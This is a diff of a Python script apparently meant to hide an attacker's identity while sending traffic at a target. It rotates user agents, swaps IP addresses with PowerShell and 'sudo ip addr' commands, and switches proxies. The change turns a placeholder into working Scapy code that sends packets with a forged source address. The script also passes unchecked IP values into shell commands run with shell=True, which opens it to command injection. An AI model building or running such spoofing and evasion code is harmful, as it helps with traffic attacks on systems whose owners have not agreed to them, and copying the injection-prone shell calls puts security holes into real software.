@@ -6,6 +6,7 @@ import string
 import subprocess
 import os
 from user_agents import USER_AGENTS
+from scapy.all import *
 
 # Configuration
 TARGET_IP = '127.0.0.1'
@@ -65,22 +66,23 @@ def change_ip():
         set_proxy(proxy)
 
 def change_ip_windows(ip):
-    ps_command = """
+    ps_command = f"""
     $newIP = "{ip}"
     $interfaceAlias = "Ethernet"
     $currentInterface = Get-NetAdapter -Name $interfaceAlias
     $currentInterface | New-NetIPAddress -IPAddress $newIP -PrefixLength 24 -DefaultGateway "192.168.1.1"
     """
-    subprocess.run(["powershell", "-Command", ps_command.format(ip=ip)], shell=True)
+    subprocess.run(["powershell", "-Command", ps_command], shell=True)
 
 def change_ip_linux(ip):
     linux_command = f"sudo ip addr add {ip}/24 dev eth0"
     subprocess.run(linux_command, shell=True)
 
 def spoof_ip(ip):
-    # Spoof the source IP in a low-level packet (this is a simplified example)
+    # Spoof the source IP in a packet using Scapy
     print(f"IP Spoofed to: {ip}")
-    # Note: IP spoofing implementation will depend on your environment and libraries like Scapy.
+    packet = IP(src=ip, dst=TARGET_IP)/ICMP()
+    send(packet, verbose=0)
 
 def set_proxy(proxy):
     print(f"Using Proxy: {proxy}")
